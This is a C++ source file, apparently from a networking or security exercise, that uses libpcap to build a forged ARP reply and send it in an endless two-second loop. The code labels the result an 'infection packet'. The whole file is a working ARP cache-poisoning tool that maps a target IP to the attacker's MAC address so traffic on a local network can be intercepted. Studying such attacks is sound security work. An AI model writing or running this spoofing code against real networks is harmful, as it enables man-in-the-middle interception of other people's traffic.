#include "make_send_reply_packet.h"

void send_reply_arp(pcap_t* pcd, uint8_t packet[42], int packet_len){
    //You need to add about infection expect !!   <- add here!!
    while(true){
        pcap_sendpacket(pcd,static_cast<u_char*>(packet),packet_len);
        sleep(2);
        //cout << " >> Sending infection packet !!" << endl;
    }
}
void make_send_reply_packet(parse_data *parse){
    uint8_t reply_packet[42]{0};
    memset(reply_packet,0,42);
    memcpy(reply_packet,parse->using_sender_mac(),6);
    memcpy(reply_packet+6,parse->using_attack_mac(),6);
    memcpy(reply_packet+12,&parse->uat.ether_arp_type,2);
    memcpy(reply_packet+14,&parse->uat.hardware_type,2);
    memcpy(reply_packet+16,&parse->uat.ipv4_type,2);
    memcpy(reply_packet+18,&parse->uat.hardware_size,1);
    memcpy(reply_packet+19,&parse->uat.protocol_size,1);
    memcpy(reply_packet+20,&parse->uat.reply_opcode,2);
    memcpy(reply_packet+22,parse->using_attack_mac(),6);
    memcpy(reply_packet+28,parse->using_target_ip(),4);
    memcpy(reply_packet+32,parse->using_sender_mac(),6);
    memcpy(reply_packet+38,parse->using_sender_ip(),4);
    pcap_t *pcd;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcd = pcap_open_live(parse->using_interface(), BUFSIZ, 1 , 1, errbuf);
    if(pcd==nullptr){
        printf("%s\n",errbuf);
        exit(1);
    }
    parse->get_arp_reply_packet_data(reply_packet,42,pcd);
}
